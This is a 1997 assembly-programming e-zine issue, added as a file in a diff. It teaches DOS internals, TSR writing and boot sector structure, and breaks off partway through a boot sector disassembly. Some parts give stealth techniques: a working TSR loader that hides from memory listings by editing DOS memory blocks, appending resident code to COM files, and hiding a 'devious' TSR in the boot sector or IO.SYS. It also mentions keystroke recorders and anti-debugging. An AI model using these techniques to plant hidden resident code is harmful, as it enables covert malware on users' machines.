@@ -1,0 +1,1357 @@
+HCF Magazine - Issue 001					 November 1997
+
+
+                   +-------------------------------------+
+                   | H A L T   &   C A T C H   F I R E ! |
+                   +-------------------------------------+
+
+
+> Introduction to HCF  <
+
+I started this magazine as a way to distribute and encourage ideas among
+assembly language programmers for the 80x86, as well as help along beginners.
+The skew of this magazine will be toward TSRs, joke programs, and other types
+of programs that have fun/devious purposes.  Most of the articles in this
+magazine will have information or techniques that can be applied to these
+areas.  The name HCF stands for 'Halt and Catch Fire', a semi-mythical
+assembly mnemonic explained in the Jargon File.  I think this mnemonic fits
+the general theme of this magazine.
+I hope to keep this magazine going, but there are very few assembly
+programmers where I live (Wichita, KS).  I plan on putting out issues one or
+two months apart, depending on how fast I can get material together for the
+magazine.  This first issue will cover a lot of the basics, which later issues
+will build on.  It will probably be a little bigger than later issues.
+Anyway, I hope you enjoy this magazine!
+
+									-phasm
+
+------------------------------------------------------------------------------
+
+Table of Contents
+-----------------
+
+
+Number bases and Boolean operators........................................#001
+DOS's MCB chain...........................................................#002
+The why and how of TSRs...................................................#003
+Interrupts................................................................#004
+A slick TSR loader........................................................#005
+Hooking a TSR into a COM file.............................................#006
+What goes on during boot-up...............................................#007
+A boot sector disassembly.................................................#008
+Planting a TSR in a system file...........................................#009
+Danny v6: An example of a TSR loaded from IBMBIO.COM......................#00A
+
+------------------------------------------------------------------------------
+
+Number bases and Boolean operators					  #001
+---------------------------------
+
+
+> Number bases <
+
+Knowing how to deal with binary and hexadecimal is very important in assembly
+language.  Most debuggers show hexadecimal output, and two hex digits can
+represent all possible values for a single byte.  Hexadecimal also translates
+into binary easily and vice versa.  To start off, I will show how the our
+decimal (base 10) system works.  In a base 10 system, each digit is a power of
+10.
+
+         /----------- 10,000's digit = 10^4
+         | /---------- 1,000's digit = 10^3
+         | | /---------- 100's digit = 10^2
+         | | | /--------- 10's digit = 10^1
+         | | | | /-------- 1's digit = 10^0
+         | | | | |
+56,789 = 5 6 7 8 9 = 5 * 10,000 + 6 * 1,000 + 7 * 100 + 8 * 10 + 9 * 1
+                   = 50,000 + 6,000 + 700 + 80 + 9 = 56,789
+
+Starting from the first digit, each digit increases in value by a factor of
+10.  Another thing to notice is that the number in each digit ranges from 0 to
+9 because if there was a symbol with a value of 10, it would have the same
+value as a 1 in the digit to the left of it.  When multiplying by 10, a zero
+is added onto the end.  When dividing by 10 (and keeping the number an
+integer), a digit is lopped off.  Also notice that the biggest number that can
+be represented with 5 digits = 10^5 - 1, which gives 10^5 possible different
+values.
+Generalizing, lets assume I'm working in base n.  Then the first digit's value
+is 1.  The next one is n, the next n^2, the next n^3, etc.  The value each
+digit can take on is from 0 to (n - 1).  If there were a symbol with a value
+of n in the n^2 digit, then this would simplify into n^2 * n = n^3.
+The first example will use binary.  What is the number '10101101' equivalent
+to in decimal?
+
+           /---------------- 128's digit = 2^7
+           | /--------------- 64's digit = 2^6
+           | | /------------- 32's digit = 2^5
+           | | | /----------- 16's digit = 2^4
+           | | | | /---------- 8's digit = 2^3
+           | | | | | /-------- 4's digit = 2^2
+           | | | | | | /------ 2's digit = 2^1
+           | | | | | | | /---- 1's digit = 2^0
+           | | | | | | | |
+10101101 = 1 0 1 0 1 1 0 1
+         = 1*128 + 0*64 + 1*32 + 0*16 + 1*8 + 1*4 + 0*2 + 1*1
+         = 128 + 32 + 8 + 4 + 1 = 173
+
+Notice also that if '11111111' is used, the sum will be equal to 2^8 - 1 =
+255.  Hopefully you've caught onto this.  Now for hexadecimal, base 16.  This
+number base needs six more symbols.  These are represented by A, B, C, D, E,
+and F which have values in decimal of 10, 11, 12, 13, 14, and 15 respectively.
+Hexadecimal works the same way, except that now 16^n is used for the digits.
+I mentioned earlier that it is easy to convert from binary to decimal and vice
+versa.  This is because a 4-digit binary number has a 2^4 possible values
+ranging from 0 to (2^4 - 1) = 15.  This coincides with the range for a single
+hexadecimal digit.  So a binary number can be divided into 4-digit chunks and
+each chunk converted into a hex digit.  Using the previous example, then
+'1101' chunk is 13 in decimal, which is D in hex.  The '1010' chunk is 10 in
+decimal, or A in hex.  So the hex number is AD.
+
+> Boolean operators <
+
+The Boolean operators supported in the 80x86 instruction set are AND, OR, XOR,
+and NOT.  To do a Boolean operation by hand, the numbers involved must first
+be converted to binary.  The operators use simple rules to compute results.
+To AND two numbers, line them up so there is a correspondence between the bits
+of the two numbers.
+
+173 = 10101101
+ 97 = 01100001
+
+Then, look at each pair of bits.  If both bits are 1s, then the result will be
+a '1'; otherwise it is a '0'.  The result of AND on these numbers is
+
+173 = 10101101
+ 97 = 01100001
+---------------AND
+ 33 = 00100001
+
+The rule for OR is that if both bits are '0', the result is '0'; otherwise the
+result is '1'.  For XOR, if the bits are different, the result is '1'.  If the
+bits are the same, the result is '0'.  NOT takes a single number and flips
+each bit; that is 1s become 0s and vice versa.
+The AND operator can be used to mask bit patterns.  For example, if I want
+only the lower 4 bits of a number, I would use the mask '00001111'.  So if the
+number I want to mask is '10011011',
+
+10011011 - number to be masked
+00001111 - mask
+---------AND
+00001011 - lower 4 bits saved
+
+The OR operator allows you to set specific bits.  If I wanted to set the
+lowest and highest bits of a number, I would OR the number with '10000001'.
+The NOT operator will flip all of the bits.  The XOR operator will flip
+specific bits.  XORing a number with '00001111' will flip the lower 4 bits.
+A common way to represent bit operations is with truth tables.  The tables are
+composed of three columns.  The first two columns are the input bits, and the
+third column is the output bit.  The table for NOT is an exception, because it
+only has one input bit.
+
+  Bitwise AND       Bitwise OR        Bitwise XOR     Bitwise NOT
+ A | B | Output    A | B | Output    A | B | Output    A | Output
+---+---+-------   ---+---+-------   ---+---+-------   ---+-------
+ 0 | 0 |   0       0 | 0 |   0       0 | 0 |   0       0 |   1
+ 0 | 1 |   0       0 | 1 |   1       0 | 1 |   1       1 |   0
+ 1 | 0 |   0       1 | 0 |   1       1 | 0 |   1
+ 1 | 1 |   1       1 | 1 |   1       1 | 1 |   0
+
+In the field of electronics there are several other Boolean operations such as
+NAND, NOR, XNOR, and IMP, but they are not implemented on the 80x86.  However,
+these operations are combinations of the Boolean operations already shown.
+NAND is equivalent to doing an AND and using NOT on the output.  NOR is the
+same process for OR, and XNOR is the same process for XOR.  IMP is a lopsided
+function.  All the Boolean operations shown so far are the same even if the
+input bits are reversed.  IMP (for IMPlied) returns a 1 unless A = 1 and B =
+0, in which case it returns a 0.
+
+------------------------------------------------------------------------------
+
+DOS's MCB chain								  #002
+---------------
+
+
+> What MCBs are and their structure <
+
+DOS has a very simple system for memory management.  DOS uses a linked list of
+Memory Control Blocks (MCBs).  The MCBs have no protection against being
+overwritten or tampered with (which is very useful; see article 005).  Each
+MCB is located on a segment boundary and is 16 bytes (1 paragraph) long.
+Immediately after the MCB is the memory that the MCB "controls".  Immediately
+after this block of memory is the next MCB.  The format for an MCB is as
+follows.
+
+Offset	Description
+0	(Byte) MCB marker; 'M' normally, 'Z' if last MCB in chain
+1	Segment of PSP of owner or special flag (0000 = free, 0008 = DOS)
+3	(Word) Number of paragraphs in block of allocated memory
+5	Three bytes not used by DOS
+8	For DOS 4.0+, ASCIIZ program name for PSPs; unused otherwise
+
+To get the segment of the first MCB, DOS's subfunction 52h can be used to get
+the list of lists.  The pointer is returned in ES:BX.  The first MCB's segment
+number is stored at ES:[BX - 2].  To trace to the next MCB, add the value at
+offset three of the MCB to the segment of the MCB, and then increment the
+result.  This will be the segment of the next MCB.  The last MCB in a chain
+will have a marker 'Z' instead of the usual 'M'.
+
+> Why are MCBs important? <
+
+DOS provides a couple ways to go resident.  There are two major disadvantages
+to using these functions.  The first is that these functions can be hooked,
+and the program could be stopped from going resident.  The second reason,
+which I consider more important, is that this method is wasteful and just
+plain stinks.  It requires that at least part of the PSP be intact.  The
+environment block is left in memory.  And even if the program releases the
+memory the environment block uses, this block is almost always located before
+the TSR.  This creates a small block of memory that may not be used.  And the
+third reason is that it can not be hidden very well.  The owner could be set
+to 0008, but even then there is still an MCB in plain sight that was not there
+before, and loaded after COMMAND.
+Directly manipulating the MCB chain to go resident is much better.  The
+process is considerably more complex than calling DOS.  The TSR engine later
+in this magazine has been evolved over a couple years, and can hide from
+programs such as MEM and load into upper memory.  It also uses less memory
+when loaded, although the engine makes the load size of the code larger.
+Another possible use of this information is to check if a certain program is
+running.  This can be done by tracing the MCB chain and looking for a MCB with
+the name of the target program stored in it.  This could be useful for
+something like a keystroke recorder that only records keystrokes typed while a
+certain program is running.  Another possibility is to check whether a program
+is loaded and start annoying the user if it is.
+
+------------------------------------------------------------------------------
+
+The why and how of TSRs							  #003
+-----------------------
+
+
+> Why TSRs? <
+
+There are a lot of reasons for writing TSRs.  Written properly, TSRs can be
+pop-up programs that can be called upon while running another program.  An
+example would be a pop-up language translator.  TSRs can perform some function
+when called upon or monitor activity.  A TSR that extends BIOS's support for
+COM ports is an example of the former, and a virus scanner and keystroke
+recorder are both examples of the latter.  Two common places TSRs are hooked
+are
+1)Hook the TSR to a timer, so that it is activated periodically.
+2)Hook the TSR to a interrupt service handler, so that the TSR can monitor,
+log/record, modify, or deny service requests.
+A properly written TSR can do all sorts of cool stuff that regular programs
+can not.  TSRs are an area where assembly language has a strong advantage over
+high level languages (HLLs).
+
+> Making TSRs... <
+
+TSRs have a lot of power, but a complex TSR with a lot of hooks can create a
+lot of frustration if you screw up.  Here are a few pointers to check when a
+TSR is misbehaving.
+
+> Are all the registers being preserved?  If the TSR modifies a register, is
+it being done correctly?
+
+> If the TSR continues a handler chain via an indirect jmp far, make sure that
+the CS: prefix is included in jmp far CS:[xxxx], or else the address will be
+pulled out of a memory location in the DS segment, wherever it happens to
+point to.
+
+> Remember: When passing control along a handler chain, make sure the stack is
+clean (the stack pointer and contents are the same as when the TSR received
+control).
+
+> Sometimes taking over an interrupt or handler will mess up other TSRs or
+drivers, or stop an important action from occurring.
+
+> If the TSR hooks the return of an interrupt handler, be sure to pass along
+all relevant flags to the caller (e.g., if int 21h/40h returns a carry flag,
+pass it on to the caller).  Sometimes a program will be very sensitive to
+corruption of any of its flags, so extra care may be needed to preserve the
+flags.
+
+> If the TSR is hooked up to a timer, make sure that it gets done with its job
+quickly, or the computer may be slowed down considerably.
+
+> DOS is not reentrant, and not all BIOSes are reentrant.  By reentrant, I
+mean that a function can be called while it is already working.  For example,
+suppose DOS is writing a file to disk.  If the TSR is hooked to a timer that
+decides to write to a file at this time, you could get screwed big time.
+Reentrancy at the wrong time under DOS is a Bad Thing.
+
+> Is the TSR reentrant?  If there is a chance that the TSR may be called again
+while it is active, and the TSR can't handle this, a flag that indicates that
+the TSR is active could solve this problem.
+
+> If the TSR hooks an interrupt and also uses it, does it call the original
+address, or does it do an INT directly?  If it does an INT, then the TSR will
+be activated again, and if this is allowed to continue, it won't be long
+before the stack smashes into something important.  In any case, the TSR is
+now stuck in a loop.
+
+> When hooking the return for an interrupt, make sure the flags are pushed
+onto the stack so that when the interrupt handler executes an IRET, the stack
+is not corrupted.
+
+> Is the TSR fundamentally flawed?  This question should always be kept in
+mind.
+
+------------------------------------------------------------------------------
+
+Interrupts								  #004
+----------
+
+
+> What's an interrupt? <
+
+An interrupt is similar to a far CALL except that
+
+   1. The flags register is saved, and then the CS:IP.
+   2. Interrupts are called by number, not address.
+   3. Interrupts can be initiated by outside devices, not just executing code.
+
+The first point is self-explanatory.  An interrupt pushes the flags register,
+then CS, and then IP, onto the stack.  The second point explains why the
+interrupt table exists.  The interrupt can be a number from 0 to 255, and the
+address of the interrupt handler is stored in the interrupt table.  And the
+third point means that interrupts can be initiated by other means than INT nn.
+If an exception or a divide-by-zero occurs, then an interrupt is signaled to
+the CPU.  If a device needs attention (such as the timer or keyboard), it
+signals this need by generating an interrupt.  The CPU processes hardware
+interrupts only if the interrupt enable flag is on or an NMI (non-maskable
+interrupt) has occurred.  Then the CPU will push the flags, CS, and IP onto
+the stack, clear the interrupt flag, and set CS:IP to the address for the
+interrupt handler.  If the interrupt was generated by hardware (as opposed to
+an INT instruction or a CPU-generated interrupt), the Programmable Interrupt
+Controller (PIC or 8259) stops sending hardware interrupts requests to the CPU
+until the interrupt handler sends an EOI (end-of-interrupt) to the PIC.
+
+> The interrupt table <
+
+The interrupt table starts at the very bottom of memory (0000:0000).  For all
+256 interrupts, a far address (segment:offset) is needed.  Far addresses are
+four byes each, so the interrupt table occupies 256 * 4 = 1024 bytes.  Note
+also that the BIOS data segment begins at segment 40h, which is directly after
+the interrupt table.  Segment 40h's absolute address is 00400, which is 1024
+in decimal.  The interrupt table can be written to by any program.  DOS has a
+function to hook interrupts (subfunction 25h), but it could be intercepted, so
+I prefer to write the interrupt address directly.
+
+> Other uses for the interrupt table <
+
+A lot of interrupts are usually unused, and so a tiny program can be located
+in the interrupt table if necessary.  Generally, this isn't a good idea
+because some programs (especially network software and small driver programs)
+may use them, and this should only be done if you are desperate to hide a tiny
+bit of code.
+I have used a variation on this for anti-debugging once.  The program
+revectored the divide-by-zero interrupt to 0000:0004, and placed a tiny
+decryptor at that location.  The program would later divide by zero,
+generating a divide-by-zero interrupt (a CPU generated interrupt), which
+transferred control to 0000:0004, thus executing the decryptor.
+
+------------------------------------------------------------------------------
+
+A slick TSR loader							  #005
+------------------
+
+
+> Introduction <
+
+The TSR loader I will explain here is the product of a couple of years of
+evolution.  Currently, this engine will load a TSR with no PSP overhead, be
+invisible to programs such as MEM, and tries to load into upper memory.
+I am assuming that you already know about MCBs and how they are arranged.  The
+structure of the MCB chain varies with your memory configuration.  I will take
+each case one at a time, because they each require a different method of going
+resident.
+
+> Conventional memory only <
+
+A conventional-only configuration is relatively simple.  The MCB chains end
+with an MCB with the 'Z' marker.  There is not an MCB after this memory block.
+To go resident in this case is relatively easy.  First, the size of this last
+MCB is decreased.  This creates a block of memory that is not managed, and
+thus not seen, by DOS.  The TSR can then be copied into this "non-existent"
+block of memory.  And since there isn't an MCB for this area of memory, it
+won't show up under MEM.
+
+> Upper memory available with room for the TSR <
+
+In this case, the 'Z' MCB that controls the last block is not really the last
+block.  After this last block is an MCB at the very end (usually) of
+conventional memory.  This MCB "allocates" the intervening video memory to the
+system so that the conventional and upper memory MCB chains are linked.
+Immediately after this block of memory is another MCB that begins the MCB
+chain in the UMB.  This chain also terminates with a 'Z' block.  The same
+technique is used as before to hide itself.  The size of the 'Z' block is
+decreased and the TSR is copied into the UMB.
+
+> Upper memory available, but not enough room for the TSR <
+
+This is the most complicated of the three cases.  Two MCBs must be manipulated
+in this case.  First of all, the 'Z' MCB in conventional memory must be shrunk
+by the amount needed.  Then, a new MCB must be created immediately after this
+block.  This MCB must be the size of the original MCB at the top of
+conventional memory plus the size taken from the 'Z' block.  So in addition to
+video memory, this MCB also allocates some conventional memory.  Then the TSR
+is copied into this area of memory.
+
+> The engine <
+
+This is the commented source code for the TSR header file I use.  Keep in mind
+that my programs are almost exclusively COM files.  When I write a TSR, I
+usually just open this file and add my code after the label 'tsr:'.  To
+assemble, I first TASM the source, and then TLINK/t the object file.  The
+source code is public domain, so feel free to use and abuse.
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+.8086
+code	segment byte public
+	assume cs:code, ds:code
+	org	100h
+
+start:
+	jmp	initialize		;This,
+	nop				;this,
+	nop				;and this are important (they later
+					;form part of an MCB
+	tag db 'phasm 06/97'		;This is my tag which I put in many of
+					;my TSRs
+
+thedata:
+	oldint	dw 0, 0			;The old interrupt address
+
+					;I often store data here (optional)
+
+tsr:					;The interrupt handler goes here
+
+
+initialize:				;The tsr engine begins
+	cld
+	push	ds
+	xor	ax, ax
+	mov	ds, ax
+	mov	si, 1ch * 4		;Address of interrupt to hook
+	mov	di, offset oldint
+	cli
+	movsw
+	movsw				;Save the original handler's address
+	sti
+	pop	ds
+	;let's see if we can load into upper memory...
+	mov	cx, offset initialize - offset thedata
+	shr	cx, 4
+	inc	cx
+	mov	ax, cs
+	dec	ax
+	mov	es, ax
+	mov	ds:[100h], es		;Save a segment here just in case
+keepgoing1:
+	mov	ax, es:[3]
+	mov	bx, es
+	add	ax, bx
+	inc	ax
+	mov	es, ax			;The location of the next MCB
+	cmp	byte ptr es:[0], 'M'
+	je	valid1
+	cmp	byte ptr es:[0], 'Z'
+	jne	failed
+	mov	ds:[100h], es		;Save segment of 'Z' block at [100h]
+valid1:
+	cmp	ax, 0a000h
+	jb	keepgoing1		;Keep going if still in conventional
+keepgoing2:
+	mov	al, es:[0]
+	cmp	al, 'M'
+	je	donevalidcheck
+	cmp	al, 'Z'
+	je	checkitout
+failed:
+	mov	es, ds:[100h]		;Restore segment of 'Z' block
+	jmp	short goresident	;Go resident
+
+failed2:
+	mov	es, ds:[100h]		;Get the segment of 'Z' block
+	mov	byte ptr ds:[100h], 'M'	;MCB marker
+	mov	word ptr ds:[101h], 8	;DOS owned
+	mov	ax, es
+	add	ax, es:[3]
+	inc	ax
+	mov	ds, ax			;Move to next MCB (link to UMB)
+	mov	bx, ds:[3]		;Get the size
+	push	cs
+	pop	ds
+	add	bx, cx			;Add size of TSR
+	mov	ds:[103h], bx		;Store size
+	sub	es:[3], cx		;Reduce size of 'Z' block
+	inc	cx
+	jmp	short goresident2
+
+donevalidcheck:
+	mov	ax, es
+	add	ax, es:[3]
+	inc	ax
+	mov	es, ax			;Go to next MCB
+	jmp	short keepgoing2	;Go back and do it again
+
+checkitout:
+	mov	ax, es:[1]		;Owner
+	test	ax, ax			;Is the block free?
+	jnz	failed2			;Branch if not free
+	mov	ax, es:[3]		;Size of block
+	cmp	ax, cx
+	jb	failed2			;Jump if the block isn't big enough
+	;we'll load into memory and hide
+goresident:
+	mov	byte ptr ds:[100h], 'H'
+	mov	word ptr ds:[101h], 7965h       ; 'ey' in memory
+	mov	word ptr ds:[103h], 2021h       ; '! ' in memory
+	inc	cx				;Basically, this just writes
+						;'Hey! ' in front of tsr
+	sub	es:[3], cx		;Decrease size of 'Z' block
+goresident2:
+	mov	ax, es
+	add	ax, es:[3]
+	inc	ax
+	mov	es, ax
+	mov	si, 100h
+	xor	di, di
+	shl	cx, 1
+	shl	cx, 1
+	shl	cx, 1
+	rep	movsw			;Move TSR into new memory block
+	sub	ax, 10h			;In one case, the start of the TSR is
+					;an MCB
+	xor	bx, bx
+	mov	ds, bx
+	cli
+	mov	ds:[1ch * 4], offset tsr	;Hook the TSR
+	mov	ds:[1ch * 4 + 2], ax
+	;terminate
+	int	20h			;Gone resident
+
+code	ends
+
+end	start
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+------------------------------------------------------------------------------
+
+Hooking a TSR into a COM file						  #006
+-----------------------------
+
+
+> COM file structure <
+
+COM files do not have any structure.  They are given all available memory, but
+are loaded into a single segment.  The program is loaded at offset 100h of the
+segment, and this is where program execution begins.  All segment registers
+are the same as CS.  The word 0000 is located at the top of the stack.
+Register setup is usually as follows.
+
+AL = 00 if first parameter has valid drive specifier, FF otherwise
+AH = 00 if second parameter has valid drive specifier, FF otherwise
+BX = 0000
+CX = 00FF
+DX = CS
+SI = IP
+DI = SP
+SP = offset of last available word in CS (usually, but not always FFFE)
+BP = 091C (don't know why)
+DS = CS
+ES = CS
+SS = CS
+CS = code segment
+IP = 0100
+
+So what's important when hooking a TSR into a COM file?  The AX register
+contains information about the validity of drive specifiers in command-line
+parameters.  The SP register is also important to maintain (as in any
+program).  So as long as the AX register is saved, the rest of the registers
+can have their contents restored with hard-wired values.
+The usual method for hooking a COM file is pretty simple.  The first step is
+to transfer control to your TSR by placing a JMP at the start of the COM file.
+Your TSR will be appended to the original COM file.  The TSR loader can either
+use relocatable code which is not affected by the offset at which it is run,
+or it can be hard-wired for a particular offset that suits a certain COM file.
+Relocatable code usually works like the following.
+
+	call	findreloc		;in relative terms, CALL 0000
+findreloc:
+	pop	bp			;pop actual offset of 'findreloc'
+					;into bp
+	sub	bp, offset findreloc	;subtract original offset of
+					;'findreloc' used during assembly
+					;to determine difference between
+					;assumed org and real org
+
+The TSR loader should then do its stuff, and go resident.  Using one of DOS's
+TSR functions should not be done, since the original COM must run.  The TSR
+must be copied elsewhere into memory to stay resident.  Note that the TSR
+itself must either be hardwired for a specific org (by the loader copying the
+TSR to a specific offset in the target segment), or the TSR must be
+relocatable.  Once done, the TSR loader should restore the original three
+bytes of the COM file (at [0100]).  The registers must also be restored, and
+the stack cleared.  Then, if the program uses relocatable code, a JMP SI can
+be executed to begin executing the original COM.  If hard-wired offsets are
+used, then a way to hard-wire the JMP can be found.  This can be done by
+adding the following.
+
+	jmp	comstart		;the instruction to jmp
+
+	;...other code...
+
+	;add to the end of program
+	org	100h
+comstart:
+
+------------------------------------------------------------------------------
+
+What goes on during boot-up						  #007
+---------------------------
+
+
+> In the beginning.... <
+
+Here is a quick and dirty description of the boot up process.  The first step
+toward boot-up is when the BIOS loads the first sector of the disk.  The
+sector is loaded into memory at 0000:7C00, and this is where execution begins.
+The boot sector checks whether system files are present.  If they are, it
+loads usually the first three sectors of IO.SYS (on some systems IBMBIO.COM).
+This program is then run.  It loads the rest of itself and performs some basic
+operations.  It then loads MSDOS.SYS (on some systems IBMDOS.COM) at the top
+of memory.  MSDOS.SYS contains the DOS kernel.  IO.SYS performs a few more
+functions, and then relocates MSDOS.SYS downwards.  Originally, the int 21h
+vector is up high with MSDOS.SYS, but when it is relocated down, a new vector
+is set.  CONFIG.SYS is processed, and then the command interpreter is loaded,
+and it processes AUTOEXEC.BAT.
+
+> TSRs and the boot-up sequence <
+
+Okay, suppose you've made a really devious TSR that you want to put on a
+machine, but you want it to load before other programs.  Placing it in the
+AUTOEXEC.BAT is too simple and easily removed.  Attaching it to another
+program is another alternative, but it requires finding the right program to
+attach the TSR to.  There are a few alternative places to hide your TSR.  The
+TSR could be loaded by a boot sector program.  If it is hooked here, then the
+program must be responsible for loading and executing the real boot sector.
+If the TSR is hooked into IO.SYS, it could go resident and then restore IO.SYS
+to its original form before running it.
+TSRs that load this early in the boot sequence are harder to track down and
+harder to remove than a simple batch file command.  They also have access to
+the original interrupt handlers (e.g. interrupts 13h and 21h).
+
+------------------------------------------------------------------------------
+
+A boot sector disassembly						  #008
+-------------------------
+
+
+> Boot sector format <
+
+Before doing this disassembly, boot records seemed pretty mysterious.  I hope
+that this will demonstrate that boot records are not that mysterious, and are
+pretty straight-forward.  I used MS-DOS's DEBUG to disassemble the code, so
+the commands at the hyphen (-) prompts are DEBUG commands.
+Here is the format of the boot sector.
+
+Offset	Description
+00	Short JMP instruction followed by NOP for DOS 3.x+, near JMP for 2.x
+03	(8 bytes) OEM name and version
+0B	(word) bytes/sector
+0D	(byte) sectors/cluster (must be a power of 2)
+0E	(word) reserved sectors starting at logical sector 0
+10	(byte) number of FATs
+11	(word) max number of root directory entries
+13	(word) total number of logical sectors.  If the disk has over 65,535
+	sectors (32MB) then 0000 is placed here, and actual number of sectors
+	is placed at offset 26h
+15	(byte) media descriptor byte
+16	(word) number of sectors occupied by single FAT
+18	(word) sectors/track
+1A	(word) number of heads
+1C	(word) number of hidden sectors before this partition
+---Extended boot record (DOS 4.0+) starts here---
+1E	(word) upper word of dword count of sectors before this partition
+20	(dword) total number of logical sectors
+24	(word) physical drive number (INT 13 compatible)
+26	(byte) extended boot record signature (29h)
+27	(dword) volume serial number
+2B	(11 bytes) volume label
+36	(8 bytes) file system ID (e.g. "FAT12   " or "FAT16   "
+3E	Boot code usually begins here
+
+When booting from a diskette, the register setup was as follows:
+AX = 0000  BX = 7C00  CX = 0001  DX = 0000
+SI = 4B9F  DI = 0003  BP = 0000  Flags = 0246
+DS = 0000  ES = 0000  SS = 0000  SP = 03F6
+CS = 0000  IP = 7C00
+
+I don't know which registers are important except DL, which must be set to the
+drive that is being booted from.  So when my hard disk boots, DL is probably
+80h.  Also notice that SS:SP points to the last couple interrupts in the
+interrupt table.  Any data pushed onto the stack will overwrite the top of the
+interrupt table.
+The following is a disassembly of an MS-DOS 6.21 boot record off of my 210MB
+hard disk.  I've examined boot sectors from various versions of DOS, and most
+follow the same general pattern.  There have been a couple which are a little
+different, but function the same.  In a future article, I may disassemble a
+boot sector formatted by FDFORMAT, which creates a boot sector program that
+automatically tries to boot from the hard disk if the floppy disk does not
+contain system files.
+
+> MS-DOS 6.21 Boot Record Disassembly <
+
+-u7c00 7c02
+0000:7C00 EB3C          JMP     7C3E    	;Jump to real start of boot
+						;program
+0000:7C02 90            NOP			;Filler for the previous jmp
+-u7c3e 7d9d
+0000:7C3E FA            CLI
+0000:7C3F 33C0          XOR     AX,AX
+0000:7C41 8ED0          MOV     SS,AX
+0000:7C43 BC007C        MOV     SP,7C00		;Set SS:SP = 0000:7C00
+0000:7C46 16            PUSH    SS
+0000:7C47 07            POP     ES		;ES = 0000
+0000:7C48 BB7800        MOV     BX,0078		;BX = ptr to int 1Eh in the
+						;     interrupt table
+0000:7C4B 36            SS:
+0000:7C4C C537          LDS     SI,[BX]		;DS:SI = int 1Eh's vector
+						;int 1Eh disk parameter table
+0000:7C4E 1E            PUSH    DS
+0000:7C4F 56            PUSH    SI		;Save old vector on stack
+0000:7C50 16            PUSH    SS
+0000:7C51 53            PUSH    BX		;Save vector's address
+0000:7C52 BF3E7C        MOV     DI,7C3E
+0000:7C55 B90B00        MOV     CX,000B
+0000:7C58 FC            CLD
+0000:7C59 F3            REPZ
+0000:7C5A A4            MOVSB			;Load table (11 bytes) to
+						;0000:7C3E
+0000:7C5B 06            PUSH    ES
+0000:7C5C 1F            POP     DS	;DS = 0000
+0000:7C5D C645FE0F      MOV     BYTE PTR [DI-02],0F	;Change head settle
+							;time to 0Fh
+0000:7C61 8B0E187C      MOV     CX,[7C18]	;Get sectors/track from boot
+						;record
+0000:7C65 884DF9        MOV     [DI-07],CL	;Save value in copy of table
+0000:7C68 894702        MOV     [BX+02],AX
+0000:7C6B C7073E7C      MOV     WORD PTR [BX],7C3E	;Change int 1Eh vector
+							;to point to new copy
+							;of table at 0000:7C3E
+0000:7C6F FB            STI
+0000:7C70 CD13          INT     13		;Reset disk
+0000:7C72 7279          JB      7CED		;If error, goto nonsystemdisk
+0000:7C74 33C0          XOR     AX,AX
+0000:7C76 3906137C      CMP     [7C13],AX	;Are the # of sectors stored
+						;in normal boot record?
+0000:7C7A 7408          JZ      7C84		;If not, goto findendofFAT
+0000:7C7C 8B0E137C      MOV     CX,[7C13]	;Get # of sectors
+0000:7C80 890E207C      MOV     [7C20],CX	;Store in extended boot record
+findendofFAT:
+0000:7C84 A0107C        MOV     AL,[7C10]	;Get # of FATs
+0000:7C87 F726167C      MUL     WORD PTR [7C16]	;Multiply by # sectors in FAT
+0000:7C8B 03061C7C      ADD     AX,[7C1C]	;Add # hidden sectors (low)
+0000:7C8F 13161E7C      ADC     DX,[7C1E]	;Add # hidden sectors (high)
+0000:7C93 03060E7C      ADD     AX,[7C0E]	;Add # reserved sectors
+0000:7C97 83D200        ADC     DX,+00
+0000:7C9A A3507C        MOV     [7C50],AX
+0000:7C9D 8916527C      MOV     [7C52],DX	;Save two copies of # sectors
+0000:7CA1 A3497C        MOV     [7C49],AX	;to end of FAT (start of
+0000:7CA4 89164B7C      MOV     [7C4B],DX	;directory area)
+0000:7CA8 B82000        MOV     AX,0020		;Size of directory entry
+0000:7CAB F726117C      MUL     WORD PTR [7C11]	;Calculate root directory size
+0000:7CAF 8B1E0B7C      MOV     BX,[7C0B]	;BX = bytes/sector
+0000:7CB3 03C3          ADD     AX,BX		;Determine # sectors used by
+0000:7CB5 48            DEC     AX		;root directory even if
+0000:7CB6 F7F3          DIV     BX		;sectors not fully used
+0000:7CB8 0106497C      ADD     [7C49],AX	;This copy now contains offset
+0000:7CBC 83164B7C00    ADC     WORD PTR [7C4B],+00	;in sectors to data
+							;area of disk
+0000:7CC1 BB0005        MOV     BX,0500		;Address to read to 0000:0500
+0000:7CC4 8B16527C      MOV     DX,[7C52]	;Get offset in sectors to root
+0000:7CC8 A1507C        MOV     AX,[7C50]	;directory
+0000:7CCB E89200        CALL    7D60		;Call PhysicalTranslation
+0000:7CCE 721D          JB      7CED		;If error, goto nonsystemdisk
+0000:7CD0 B001          MOV     AL,01		;Set AL = 1 sector
+0000:7CD2 E8AC00        CALL    7D81		;Call ReadData to read the
+						;root directory
+0000:7CD5 7216          JB      7CED		;If error, goto nonsystemdisk
+0000:7CD7 8BFB          MOV     DI,BX		;DI = 0500 (offset of root
+						;directory)
+0000:7CD9 B90B00        MOV     CX,000B		;CX = 11 (size of filename)
+0000:7CDC BEE67D        MOV     SI,7DE6		;Offset of first filename
+0000:7CDF F3            REPZ
+0000:7CE0 A6            CMPSB			;Is it IO.SYS?
+0000:7CE1 750A          JNZ     7CED		;If not, goto nonsystemdisk
+0000:7CE3 8D7F20        LEA     DI,[BX+20]	;Get address of next filename
+0000:7CE6 B90B00        MOV     CX,000B		;in root directory
+0000:7CE9 F3            REPZ
+0000:7CEA A6            CMPSB			;Is it MSDOS.SYS?
+0000:7CEB 7418          JZ      7D05		;If it is, goto readIOSYS
+nonsystemdisk:
+0000:7CED BE9E7D        MOV     SI,7D9E		;Get offset of "Non-System..."
+0000:7CF0 E85F00        CALL    7D52		;Call ShowMessage
+0000:7CF3 33C0          XOR     AX,AX
+0000:7CF5 CD16          INT     16		;Read a key
+0000:7CF7 5E            POP     SI
+0000:7CF8 1F            POP     DS		;DS:SI points to int 1Eh
+0000:7CF9 8F04          POP     [SI]
+0000:7CFB 8F4402        POP     [SI+02]		;Restore old int 1Eh vector
+0000:7CFE CD19          INT     19		;Reboot
+prenonsystemdisk:
+0000:7D00 58            POP     AX		;Remove registers from stack
+0000:7D01 58            POP     AX
+0000:7D02 58            POP     AX
+0000:7D03 EBE8          JMP     7CED		;Goto nonsystemdisk
+readIOSYS:
